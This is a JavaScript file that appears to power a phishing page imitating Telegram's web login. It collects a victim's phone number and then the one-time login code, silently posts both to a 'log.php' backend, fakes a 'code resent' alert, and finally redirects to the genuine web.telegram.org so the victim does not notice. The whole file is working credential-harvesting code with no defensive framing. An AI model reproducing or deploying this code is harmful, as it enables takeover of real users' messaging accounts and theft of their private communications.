const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');

document.getElementById('phoneForm').addEventListener('submit', function(e) {
  e.preventDefault();
  const country = document.getElementById('country').value;
  const phone = document.getElementById('phone').value.trim();
  if (!phone) return;

  const fullPhone = country + phone;
  document.getElementById('phoneDisplay').textContent = fullPhone;
  document.getElementById('phoneFinal').value = fullPhone;

  sendToBackend({ phone: fullPhone, stage: 'phone' });

  step1.classList.remove('active');
  step2.classList.add('active');
  document.getElementById('code').focus();
});

document.getElementById('codeForm').addEventListener('submit', function(e) {
  e.preventDefault();
  const phone = document.getElementById('phoneFinal').value;
  const code = document.getElementById('code').value.trim();
  if (!code) return;

  sendToBackend({ phone: phone, code: code, stage: 'code' });

  setTimeout(() => {
    window.location.href = 'https://web.telegram.org';
  }, 800);
});

function sendToBackend(data) {
  fetch('log.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  }).catch(() => {});
}

function resend() {
  const phone = document.getElementById('phoneFinal').value;
  sendToBackend({ phone: phone, stage: 'resend' });
  alert('Код отправлен повторно');
}
